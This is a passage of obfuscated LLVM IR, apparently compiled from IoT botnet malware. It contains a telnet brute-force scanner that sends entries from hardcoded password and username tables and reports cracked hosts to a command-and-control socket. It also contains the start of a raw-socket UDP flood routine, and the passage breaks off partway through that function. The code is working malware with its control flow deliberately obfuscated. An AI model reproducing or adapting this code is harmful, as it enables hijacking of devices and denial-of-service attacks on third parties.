  %2011 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2010, i32 0, i32 2
  store i8 4, i8* %2011, align 8
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %766
  %2012 = load i32, i32* %10, align 4
  %2013 = sext i32 %2012 to i64
  %2014 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2013
  %2015 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2014, i32 0, i32 6
  %2016 = load i32, i32* %2015, align 4
  %2017 = icmp eq i32 %2016, 0
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %795
  %2018 = load i32, i32* %10, align 4
  %2019 = sext i32 %2018 to i64
  %2020 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2019
  %2021 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2020, i32 0, i32 0
  %2022 = load i32, i32* %2021, align 16
  %2023 = load i32, i32* %10, align 4
  %2024 = sext i32 %2023 to i64
  %2025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2024
  %2026 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2025, i32 0, i32 8
  %2027 = load i8*, i8** %2026, align 8
  %2028 = load i32, i32* %10, align 4
  %2029 = sext i32 %2028 to i64
  %2030 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2029
  %2031 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2030, i32 0, i32 7
  %2032 = load i16, i16* %2031, align 16
  %2033 = zext i16 %2032 to i32
  %2034 = call i32 @readUntil(i32 %2022, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2027, i32 1024, i32 %2033)
  %2035 = icmp ne i32 %2034, 0
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %830
  %2036 = load i32, i32* %10, align 4
  %2037 = sext i32 %2036 to i64
  %2038 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2037
  %2039 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2038, i32 0, i32 6
  store i32 0, i32* %2039, align 4
  %2040 = load i32, i32* %10, align 4
  %2041 = sext i32 %2040 to i64
  %2042 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2041
  %2043 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2042, i32 0, i32 7
  store i16 0, i16* %2043, align 16
  %2044 = load i32, i32* %10, align 4
  %2045 = sext i32 %2044 to i64
  %2046 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2045
  %2047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2046, i32 0, i32 8
  %2048 = load i8*, i8** %2047, align 8
  %2049 = call i8* @strstr(i8* %2048, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i32 0, i32 0)) #10
  %2050 = icmp ne i8* %2049, null
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %867
  %2051 = load i32, i32* %10, align 4
  %2052 = sext i32 %2051 to i64
  %2053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2052
  %2054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2053, i32 0, i32 2
  store i8 100, i8* %2054, align 8
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %894
  %2055 = load i32, i32* %10, align 4
  %2056 = sext i32 %2055 to i64
  %2057 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2056
  %2058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2057, i32 0, i32 8
  %2059 = load i8*, i8** %2058, align 8
  %2060 = call i8* @strstr(i8* %2059, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i32 0, i32 0)) #10
  %2061 = icmp ne i8* %2060, null
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %933
  %2062 = load i32, i32* %10, align 4
  %2063 = sext i32 %2062 to i64
  %2064 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2063
  %2065 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2064, i32 0, i32 8
  %2066 = load i8*, i8** %2065, align 8
  %2067 = call i64 @strlen(i8* %2066) #10
  %2068 = trunc i64 %2067 to i16
  %2069 = load i32, i32* %10, align 4
  %2070 = sext i32 %2069 to i64
  %2071 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2070
  %2072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2071, i32 0, i32 7
  store i16 %2068, i16* %2072, align 16
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %985
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %1002
  %2073 = load i32, i32* %10, align 4
  %2074 = sext i32 %2073 to i64
  %2075 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2074
  %2076 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2075, i32 0, i32 0
  %2077 = load i32, i32* %2076, align 16
  %2078 = load i32, i32* %10, align 4
  %2079 = sext i32 %2078 to i64
  %2080 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2079
  %2081 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2080, i32 0, i32 5
  %2082 = load i8, i8* %2081, align 1
  %2083 = zext i8 %2082 to i64
  %2084 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %2083
  %2085 = load i8*, i8** %2084, align 8
  %2086 = load i32, i32* %10, align 4
  %2087 = sext i32 %2086 to i64
  %2088 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2087
  %2089 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2088, i32 0, i32 5
  %2090 = load i8, i8* %2089, align 1
  %2091 = zext i8 %2090 to i64
  %2092 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %2091
  %2093 = load i8*, i8** %2092, align 8
  %2094 = call i64 @strlen(i8* %2093) #10
  %2095 = call i64 @send(i32 %2077, i8* %2085, i64 %2094, i32 16384)
  %2096 = icmp slt i64 %2095, 0
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %1043
  %2097 = load i32, i32* %10, align 4
  %2098 = sext i32 %2097 to i64
  %2099 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2098
  %2100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2099, i32 0, i32 0
  %2101 = load i32, i32* %2100, align 16
  %2102 = call i32 @sclose(i32 %2101)
  %2103 = load i32, i32* %10, align 4
  %2104 = sext i32 %2103 to i64
  %2105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2104
  %2106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2105, i32 0, i32 2
  store i8 0, i8* %2106, align 8
  %2107 = load i32, i32* %10, align 4
  %2108 = sext i32 %2107 to i64
  %2109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2108
  %2110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2109, i32 0, i32 3
  store i8 1, i8* %2110, align 1
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %1082
  %2111 = load i32, i32* %10, align 4
  %2112 = sext i32 %2111 to i64
  %2113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2112
  %2114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2113, i32 0, i32 0
  %2115 = load i32, i32* %2114, align 16
  %2116 = call i32 @sclose(i32 %2115)
  %2117 = load i32, i32* %10, align 4
  %2118 = sext i32 %2117 to i64
  %2119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2118
  %2120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2119, i32 0, i32 2
  store i8 0, i8* %2120, align 8
  %2121 = load i32, i32* %10, align 4
  %2122 = sext i32 %2121 to i64
  %2123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2122
  %2124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2123, i32 0, i32 3
  store i8 1, i8* %2124, align 1
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %1125
  %2125 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %2126 = load i32, i32* %10, align 4
  %2127 = sext i32 %2126 to i64
  %2128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2127
  %2129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2128, i32 0, i32 6
  store i32 %2125, i32* %2129, align 4
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %1301
  %2130 = load i32, i32* %10, align 4
  %2131 = sext i32 %2130 to i64
  %2132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2131
  %2133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2132, i32 0, i32 2
  store i8 8, i8* %2133, align 8
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %1322
  %2134 = load i32, i32* %10, align 4
  %2135 = sext i32 %2134 to i64
  %2136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2135
  %2137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2136, i32 0, i32 0
  %2138 = load i32, i32* %2137, align 16
  %2139 = call i64 @send(i32 %2138, i8* getelementptr inbounds ([266 x i8], [266 x i8]* @.str.31, i32 0, i32 0), i64 85, i32 16384)
  %2140 = icmp slt i64 %2139, 0
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1366
  %2141 = load i32, i32* %10, align 4
  %2142 = sext i32 %2141 to i64
  %2143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2142
  %2144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2143, i32 0, i32 0
  %2145 = load i32, i32* %2144, align 16
  %2146 = call i64 @send(i32 %2145, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.32, i32 0, i32 0), i64 49, i32 16384)
  %2147 = icmp slt i64 %2146, 0
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1390
  %2148 = load i32, i32* %10, align 4
  %2149 = sext i32 %2148 to i64
  %2150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2149
  %2151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2150, i32 0, i32 0
  %2152 = load i32, i32* %2151, align 16
  %2153 = call i32 @sclose(i32 %2152)
  %2154 = load i32, i32* %10, align 4
  %2155 = sext i32 %2154 to i64
  %2156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2155
  %2157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2156, i32 0, i32 2
  store i8 0, i8* %2157, align 8
  %2158 = load i32, i32* %10, align 4
  %2159 = sext i32 %2158 to i64
  %2160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2159
  %2161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2160, i32 0, i32 3
  store i8 1, i8* %2161, align 1
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1421
  %2162 = load i32, i32* %10, align 4
  %2163 = sext i32 %2162 to i64
  %2164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2163
  %2165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2164, i32 0, i32 2
  store i8 10, i8* %2165, align 8
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1442
  %2166 = load i32, i32* %10, align 4
  %2167 = sext i32 %2166 to i64
  %2168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2167
  %2169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2168, i32 0, i32 6
  %2170 = load i32, i32* %2169, align 4
  %2171 = icmp eq i32 %2170, 0
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1589
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1642
  %2172 = load i32, i32* %10, align 4
  %2173 = sext i32 %2172 to i64
  %2174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2173
  %2175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2174, i32 0, i32 0
  %2176 = load i32, i32* %2175, align 16
  %2177 = call i32 @sclose(i32 %2176)
  %2178 = load i32, i32* %10, align 4
  %2179 = sext i32 %2178 to i64
  %2180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2179
  %2181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2180, i32 0, i32 2
  store i8 0, i8* %2181, align 8
  %2182 = load i32, i32* %10, align 4
  %2183 = sext i32 %2182 to i64
  %2184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2183
  %2185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2184, i32 0, i32 3
  store i8 1, i8* %2185, align 1
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1673
  %2186 = load i32, i32* %10, align 4
  %2187 = sext i32 %2186 to i64
  %2188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2187
  %2189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2188, i32 0, i32 2
  store i8 102, i8* %2189, align 8
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1754
  %2190 = load i32, i32* %10, align 4
  %2191 = sext i32 %2190 to i64
  %2192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2191
  %2193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2192, i32 0, i32 6
  store i32 0, i32* %2193, align 4
  %2194 = load i32, i32* %10, align 4
  %2195 = sext i32 %2194 to i64
  %2196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2195
  %2197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2196, i32 0, i32 7
  store i16 0, i16* %2197, align 16
  %2198 = load i32, i32* @mainCommSock, align 4
  %2199 = load i32, i32* %10, align 4
  %2200 = sext i32 %2199 to i64
  %2201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2200
  %2202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2201, i32 0, i32 1
  %2203 = bitcast i32* %2202 to %struct.in_addr*
  %2204 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2203, i32 0, i32 0
  %2205 = load i32, i32* %2204, align 4
  %2206 = call i8* @inet_ntoa(i32 %2205) #4
  %2207 = load i32, i32* %10, align 4
  %2208 = sext i32 %2207 to i64
  %2209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2208
  %2210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2209, i32 0, i32 4
  %2211 = load i8, i8* %2210, align 2
  %2212 = zext i8 %2211 to i64
  %2213 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %2212
  %2214 = load i8*, i8** %2213, align 8
  %2215 = call i32 (i32, i8*, ...) @sockprintf(i32 %2198, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.36, i32 0, i32 0), i8* %2206, i8* %2214)
  %2216 = load i32, i32* %10, align 4
  %2217 = sext i32 %2216 to i64
  %2218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2217
  %2219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2218, i32 0, i32 0
  %2220 = load i32, i32* %2219, align 16
  %2221 = call i32 @sclose(i32 %2220)
  %2222 = load i32, i32* %10, align 4
  %2223 = sext i32 %2222 to i64
  %2224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2223
  %2225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2224, i32 0, i32 2
  store i8 0, i8* %2225, align 8
  %2226 = load i32, i32* %10, align 4
  %2227 = sext i32 %2226 to i64
  %2228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2227
  %2229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2228, i32 0, i32 8
  %2230 = load i8*, i8** %2229, align 8
  call void @llvm.memset.p0i8.i64(i8* %2230, i8 0, i64 1024, i32 1, i1 false)
  %2231 = load i32, i32* %10, align 4
  %2232 = sext i32 %2231 to i64
  %2233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2232
  %2234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2233, i32 0, i32 3
  store i8 1, i8* %2234, align 1
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1816
  %2235 = load i32, i32* %10, align 4
  %2236 = sext i32 %2235 to i64
  %2237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2236
  %2238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2237, i32 0, i32 8
  %2239 = load i8*, i8** %2238, align 8
  %2240 = call i64 @strlen(i8* %2239) #10
  %2241 = trunc i64 %2240 to i16
  %2242 = load i32, i32* %10, align 4
  %2243 = sext i32 %2242 to i64
  %2244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %2243
  %2245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2244, i32 0, i32 7
  store i16 %2241, i16* %2245, align 16
  br label %originalBB166
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

declare i32 @time(...) #5

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = load i32, i32* @x.69
  %8 = load i32, i32* @y.70
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.sockaddr_in, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  store i8* %0, i8** %15, align 8
  store i32 %1, i32* %16, align 4
  store i32 %2, i32* %17, align 4
  store i32 %3, i32* %18, align 4
  store i32 %4, i32* %19, align 4
  store i32 %5, i32* %20, align 4
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = load i32, i32* %16, align 4
  %38 = icmp eq i32 %37, 0
  %39 = load i32, i32* @x.69
  %40 = load i32, i32* @y.70
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %38, label %47, label %51

; <label>:47:                                     ; preds = %originalBBpart2
  %48 = call i32 @rand_cmwc()
  %49 = trunc i32 %48 to i16
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %49, i16* %50, align 2
  br label %56

; <label>:51:                                     ; preds = %originalBBpart2
  %52 = load i32, i32* %16, align 4
  %53 = trunc i32 %52 to i16
  %54 = call zeroext i16 @htons(i16 zeroext %53) #13
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %54, i16* %55, align 2
  br label %56

; <label>:56:                                     ; preds = %51, %47
  %57 = load i8*, i8** %15, align 8
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 2
  %59 = call i32 @getHost(i8* %57, %struct.in_addr* %58)
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %56
  br label %493

; <label>:62:                                     ; preds = %56
  %63 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 3
  %64 = getelementptr inbounds [8 x i8], [8 x i8]* %63, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 8, i32 4, i1 false)
  %65 = load i32, i32* %20, align 4
  store i32 %65, i32* %22, align 4
  %66 = load i32, i32* %18, align 4
  %67 = icmp eq i32 %66, 32
  br i1 %67, label %68, label %184

; <label>:68:                                     ; preds = %62
  %69 = call i32 @socket(i32 2, i32 2, i32 17) #4
  store i32 %69, i32* %23, align 4
  %70 = load i32, i32* %23, align 4
  %71 = icmp ne i32 %70, 0
  br i1 %71, label %75, label %72

; <label>:72:                                     ; preds = %68
  %73 = load i32, i32* @mainCommSock, align 4
  %74 = call i32 (i32, i8*, ...) @sockprintf(i32 %73, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.37, i32 0, i32 0))
  br label %493

; <label>:75:                                     ; preds = %68
  %76 = load i32, i32* %19, align 4
  %77 = add nsw i32 %76, 1
  %78 = sext i32 %77 to i64
  %79 = call noalias i8* @malloc(i64 %78) #4
  store i8* %79, i8** %24, align 8
  %80 = load i8*, i8** %24, align 8
  %81 = icmp eq i8* %80, null
  br i1 %81, label %82, label %83

; <label>:82:                                     ; preds = %75
  br label %493

; <label>:83:                                     ; preds = %75
  %84 = load i32, i32* @x.69
  %85 = load i32, i32* @y.70
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %83
  %92 = load i8*, i8** %24, align 8
  %93 = load i32, i32* %19, align 4
  %94 = add nsw i32 %93, 1
  %95 = sext i32 %94 to i64
  call void @llvm.memset.p0i8.i64(i8* %92, i8 0, i64 %95, i32 1, i1 false)
  %96 = load i8*, i8** %24, align 8
  %97 = load i32, i32* %19, align 4
  call void @makeRandomStr(i8* %96, i32 %97)
  %98 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %99 = load i32, i32* %17, align 4
  %100 = add nsw i32 %98, %99
  store i32 %100, i32* %25, align 4
  store i32 0, i32* %26, align 4
  %101 = load i32, i32* @x.69
  %102 = load i32, i32* @y.70
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart215, label %originalBB1alteredBB

originalBBpart215:                                ; preds = %originalBB1
  br label %109

; <label>:109:                                    ; preds = %originalBBpart241, %originalBBpart223, %originalBBpart215
  %110 = load i32, i32* %23, align 4
  %111 = load i8*, i8** %24, align 8
  %112 = load i32, i32* %19, align 4
  %113 = sext i32 %112 to i64
  %114 = bitcast %struct.sockaddr_in* %21 to %struct.sockaddr*
  %115 = call i64 @sendto(i32 %110, i8* %111, i64 %113, i32 0, %struct.sockaddr* %114, i32 16)
  %116 = load i32, i32* %26, align 4
  %117 = load i32, i32* %22, align 4
  %118 = icmp eq i32 %116, %117
  br i1 %118, label %119, label %164

; <label>:119:                                    ; preds = %109
  %120 = load i32, i32* %16, align 4
  %121 = icmp eq i32 %120, 0
  br i1 %121, label %122, label %142

; <label>:122:                                    ; preds = %119
  %123 = load i32, i32* @x.69
  %124 = load i32, i32* @y.70
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %122
  %131 = call i32 @rand_cmwc()
  %132 = trunc i32 %131 to i16
  %133 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %132, i16* %133, align 2
  %134 = load i32, i32* @x.69
  %135 = load i32, i32* @y.70
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br label %142

; <label>:142:                                    ; preds = %originalBBpart219, %119
  %143 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %144 = load i32, i32* %25, align 4
  %145 = icmp sgt i32 %143, %144
  br i1 %145, label %146, label %147

; <label>:146:                                    ; preds = %142
  br label %183

; <label>:147:                                    ; preds = %142
  %148 = load i32, i32* @x.69
  %149 = load i32, i32* @y.70
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %147
  store i32 0, i32* %26, align 4
  %156 = load i32, i32* @x.69
  %157 = load i32, i32* @y.70
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %109

; <label>:164:                                    ; preds = %109
  %165 = load i32, i32* @x.69
  %166 = load i32, i32* @y.70
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %164
  %173 = load i32, i32* %26, align 4
  %174 = add i32 %173, 1
  store i32 %174, i32* %26, align 4
  %175 = load i32, i32* @x.69
  %176 = load i32, i32* @y.70
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBBpart241, label %originalBB25alteredBB

originalBBpart241:                                ; preds = %originalBB25
  br label %109

; <label>:183:                                    ; preds = %146
  br label %493

; <label>:184:                                    ; preds = %62
  %185 = call i32 @socket(i32 2, i32 3, i32 17) #4
  store i32 %185, i32* %27, align 4
  %186 = load i32, i32* %27, align 4
  %187 = icmp ne i32 %186, 0
  br i1 %187, label %191, label %188

; <label>:188:                                    ; preds = %184
  %189 = load i32, i32* @mainCommSock, align 4
  %190 = call i32 (i32, i8*, ...) @sockprintf(i32 %189, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.37, i32 0, i32 0))
  br label %493

; <label>:191:                                    ; preds = %184
  store i32 1, i32* %28, align 4
  %192 = load i32, i32* %27, align 4
  %193 = bitcast i32* %28 to i8*
  %194 = call i32 @setsockopt(i32 %192, i32 0, i32 3, i8* %193, i32 4) #4
  %195 = icmp slt i32 %194, 0
  br i1 %195, label %196, label %199

; <label>:196:                                    ; preds = %191
  %197 = load i32, i32* @mainCommSock, align 4
  %198 = call i32 (i32, i8*, ...) @sockprintf(i32 %197, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.38, i32 0, i32 0))
  br label %493

; <label>:199:                                    ; preds = %191
  %200 = load i32, i32* @x.69
  %201 = load i32, i32* @y.70
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %199
  store i32 50, i32* %29, align 4
  %208 = load i32, i32* @x.69
  %209 = load i32, i32* @y.70
  %210 = sub i32 %208, 1
  %211 = mul i32 %208, %210
  %212 = urem i32 %211, 2
  %213 = icmp eq i32 %212, 0
  %214 = icmp slt i32 %209, 10
  %215 = or i1 %213, %214
  br i1 %215, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br label %216

; <label>:216:                                    ; preds = %originalBBpart261, %originalBBpart245
  %217 = load i32, i32* %29, align 4
  %218 = add nsw i32 %217, -1
  store i32 %218, i32* %29, align 4
  %219 = icmp ne i32 %217, 0
  br i1 %219, label %220, label %241

; <label>:220:                                    ; preds = %216
  %221 = load i32, i32* @x.69
  %222 = load i32, i32* @y.70
